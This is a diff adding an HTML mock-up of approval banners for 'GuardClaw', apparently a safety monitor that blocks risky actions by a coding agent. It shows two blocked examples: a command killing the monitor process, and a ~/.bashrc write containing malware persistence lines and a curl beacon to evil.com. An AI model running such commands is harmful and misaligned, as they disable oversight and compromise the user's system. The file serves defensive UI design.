@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GuardClaw — Approval Banner Mock</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  :root {
+    --gc-bg: #f3f4f6;
+    --gc-card: #ffffff;
+    --gc-border: #e5e7eb;
+    --gc-text: #111827;
+    --gc-text-secondary: #6b7280;
+    --gc-primary: #3b82f6;
+    --gc-safe: #10b981;
+    --gc-warning: #f59e0b;
+    --gc-danger: #ef4444;
+  }
+  body {
+    background: var(--gc-bg);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+</style>
+</head>
+<body class="p-8 space-y-4" style="max-width:520px">
+
+<p style="color:var(--gc-text-secondary); font-size:11px; margin-bottom:24px">GuardClaw · Approval Banner · Light Mode</p>
+
+<!-- GC Logo SVG snippet (reusable) -->
+<svg id="gc-svg-def" style="display:none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128">
+  <defs>
+    <linearGradient id="gc-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#3b82f6"/>
+      <stop offset="100%" stop-color="#8b5cf6"/>
+    </linearGradient>
+  </defs>
+  <path d="M64 8 L112 28 V64 C112 96 88 116 64 124 C40 116 16 96 16 64 V28 Z" fill="url(#gc-grad)"/>
+  <ellipse cx="64" cy="76" rx="14" ry="12" fill="white" opacity="0.95"/>
+  <ellipse cx="44" cy="56" rx="9" ry="8" fill="white" opacity="0.95"/>
+  <ellipse cx="64" cy="48" rx="9" ry="8" fill="white" opacity="0.95"/>
+  <ellipse cx="84" cy="56" rx="9" ry="8" fill="white" opacity="0.95"/>
+</svg>
+
+<!-- Card 1: exec blocked 9/10 -->
+<div style="background:var(--gc-card); border:1px solid var(--gc-border); border-left:3px solid var(--gc-danger); border-radius:10px; overflow:hidden">
+
+  <!-- Header -->
+  <div style="display:flex; align-items:center; gap:8px; padding:10px 14px; border-bottom:1px solid var(--gc-border)">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" width="15" height="15" style="flex-shrink:0">
+      <path d="M64 8 L112 28 V64 C112 96 88 116 64 124 C40 116 16 96 16 64 V28 Z" fill="url(#gc-grad)"/>
+      <ellipse cx="64" cy="76" rx="14" ry="12" fill="white" opacity="0.95"/>
+      <ellipse cx="44" cy="56" rx="9" ry="8" fill="white" opacity="0.95"/>
+      <ellipse cx="64" cy="48" rx="9" ry="8" fill="white" opacity="0.95"/>
+      <ellipse cx="84" cy="56" rx="9" ry="8" fill="white" opacity="0.95"/>
+    </svg>
+    <span style="font-size:11px; font-weight:600; color:var(--gc-danger); letter-spacing:0.04em; text-transform:uppercase">Blocked</span>
+    <span style="font-size:11px; color:var(--gc-text-secondary); font-family:monospace">Bash</span>
+    <span style="font-size:11px; color:var(--gc-border)">·</span>
+    <!-- CC badge -->
+    <span style="font-size:10px; font-weight:600; color:#7c3aed; background:#f5f3ff; border:1px solid #ddd6fe; border-radius:99px; padding:1px 8px">Claude Code</span>
+    <div style="flex:1"></div>
+    <!-- Score badge -->
+    <span style="font-size:12px; font-weight:700; color:var(--gc-danger); background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.2); border-radius:6px; padding:2px 7px; font-family:monospace">9/10</span>
+    <span style="font-size:11px; color:var(--gc-text-secondary)">16s</span>
+  </div>
+
+  <!-- Command -->
+  <div style="padding:12px 14px; border-bottom:1px solid var(--gc-border)">
+    <div style="font-size:10px; font-weight:500; color:var(--gc-text-secondary); letter-spacing:0.06em; text-transform:uppercase; margin-bottom:6px">Command</div>
+    <code style="display:block; font-size:12px; color:#0f766e; font-family:'SF Mono',monospace; line-height:1.6; background:#f0fdf4; border:1px solid #bbf7d0; border-radius:6px; padding:8px 10px; white-space:pre-wrap; word-break:break-all">pkill -f guardclaw</code>
+    <!-- Reason -->
+    <p style="font-size:11px; color:var(--gc-text-secondary); margin-top:8px; line-height:1.5">Rule-based: Killing GuardClaw safety monitor process</p>
+  </div>
+
+  <!-- Actions -->
+  <div style="display:grid; grid-template-columns:1fr auto 1fr; border-top:0">
+    <button style="padding:10px; font-size:12px; font-weight:600; color:#059669; background:none; border:none; cursor:pointer; border-right:1px solid var(--gc-border)">✓ Approve</button>
+    <button style="padding:10px 14px; font-size:11px; font-weight:500; color:var(--gc-text-secondary); background:none; border:none; cursor:pointer; border-right:1px solid var(--gc-border)">Always</button>
+    <button style="padding:10px; font-size:12px; font-weight:600; color:var(--gc-danger); background:none; border:none; cursor:pointer">✕ Deny</button>
+  </div>
+
+</div>
+
+
+<!-- Card 2: write blocked 8/10 -->
+<div style="background:var(--gc-card); border:1px solid var(--gc-border); border-left:3px solid var(--gc-warning); border-radius:10px; overflow:hidden">
+
+  <div style="display:flex; align-items:center; gap:8px; padding:10px 14px; border-bottom:1px solid var(--gc-border)">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" width="15" height="15" style="flex-shrink:0">
+      <path d="M64 8 L112 28 V64 C112 96 88 116 64 124 C40 116 16 96 16 64 V28 Z" fill="url(#gc-grad)"/>
+      <ellipse cx="64" cy="76" rx="14" ry="12" fill="white" opacity="0.95"/>
+      <ellipse cx="44" cy="56" rx="9" ry="8" fill="white" opacity="0.95"/>
+      <ellipse cx="64" cy="48" rx="9" ry="8" fill="white" opacity="0.95"/>
+      <ellipse cx="84" cy="56" rx="9" ry="8" fill="white" opacity="0.95"/>
+    </svg>
+    <span style="font-size:11px; font-weight:600; color:var(--gc-warning); letter-spacing:0.04em; text-transform:uppercase">Blocked</span>
+    <span style="font-size:11px; color:var(--gc-text-secondary); font-family:monospace">Write</span>
+    <span style="font-size:11px; color:var(--gc-border)">·</span>
+    <span style="font-size:10px; font-weight:600; color:#7c3aed; background:#f5f3ff; border:1px solid #ddd6fe; border-radius:99px; padding:1px 8px">Claude Code</span>
+    <div style="flex:1"></div>
+    <span style="font-size:12px; font-weight:700; color:var(--gc-warning); background:rgba(245,158,11,0.08); border:1px solid rgba(245,158,11,0.2); border-radius:6px; padding:2px 7px; font-family:monospace">8/10</span>
+    <span style="font-size:11px; color:var(--gc-text-secondary)">2s</span>
+  </div>
+
+  <div style="padding:12px 14px; border-bottom:1px solid var(--gc-border)">
+    <div style="font-size:10px; font-weight:500; color:var(--gc-text-secondary); letter-spacing:0.06em; text-transform:uppercase; margin-bottom:6px">~/.bashrc</div>
+    <code style="display:block; font-size:12px; color:#0369a1; font-family:'SF Mono',monospace; line-height:1.6; background:#f0f9ff; border:1px solid #bae6fd; border-radius:6px; padding:8px 10px; white-space:pre-wrap; word-break:break-all; max-height:80px; overflow-y:auto">export PATH="$HOME/.malware/bin:$PATH"
+alias sudo='sudo --evil'
+curl https://evil.com/beacon &</code>
+    <p style="font-size:11px; color:var(--gc-text-secondary); margin-top:8px; line-height:1.5">Persistence blacklist: writing to shell profile (~/.bashrc)</p>
+  </div>
+
+  <div style="display:grid; grid-template-columns:1fr auto 1fr">
+    <button style="padding:10px; font-size:12px; font-weight:600; color:#059669; background:none; border:none; cursor:pointer; border-right:1px solid var(--gc-border)">✓ Approve</button>
+    <button style="padding:10px 14px; font-size:11px; font-weight:500; color:var(--gc-text-secondary); background:none; border:none; cursor:pointer; border-right:1px solid var(--gc-border)">Always</button>
+    <button style="padding:10px; font-size:12px; font-weight:600; color:var(--gc-danger); background:none; border:none; cursor:pointer">✕ Deny</button>
+  </div>
+
+</div>
+
+</body>
+</html>
